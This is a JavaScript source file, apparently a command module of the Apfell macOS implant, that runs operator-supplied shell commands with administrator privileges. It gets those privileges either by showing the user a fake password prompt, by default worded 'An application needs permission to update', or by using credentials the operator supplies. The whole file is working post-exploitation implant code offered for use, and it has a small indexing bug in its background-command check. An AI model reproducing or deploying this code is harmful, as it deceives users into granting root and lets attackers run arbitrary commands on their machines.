exports.shell_elevated = function(task, command, params){
    try{
        let response = "";
        let pieces = [];
        let cmd = "";
        if(params.length > 0){ pieces = JSON.parse(params); }
        else{ pieces = []; }
        if(pieces.hasOwnProperty('command') && pieces['command'] !== ""){
            if(pieces['command'][command.length -1] === "&"){
                cmd = pieces['command'] + "> /dev/null &";
            }else{
                cmd = pieces['command'];
            }
        }
        else{
            return {"user_output": "missing command", "completed": true, "status": "error"};
        }
        let use_creds = false;
        let prompt = "An application needs permission to update";
        if(pieces.hasOwnProperty('use_creds') && typeof pieces['use_creds'] === "boolean"){ use_creds = pieces['use_creds'];}
        if(!use_creds){
            if(pieces.hasOwnProperty('prompt') && pieces['prompt'] !== ""){ prompt = pieces['prompt'];}
            try{
                response = currentApp.doShellScript(cmd, {administratorPrivileges:true,withPrompt:prompt});
            }
            catch(error){
                // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
                response = error.toString().replace(/\r/g, "\n");
                return {"user_output":response, "completed": true, "status": "error"};
            }
        }
        else{
            let userName = apfell.user;
            let password = "";
            if(pieces.hasOwnProperty('user') && pieces['user'] !== ""){ userName = pieces['user']; }
            if(pieces.hasOwnProperty('credential')){ password = pieces['credential']; }
            try{
                response = currentApp.doShellScript(cmd, {administratorPrivileges:true, userName:userName, password:password});
            }
            catch(error){
                // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
                response = error.toString().replace(/\r/g, "\n");
                return {"user_output":response, "completed": true, "status": "error"};
            }
        }
        // shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
        response = response.replace(/\r/g, "\n");
        return {"user_output":response, "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
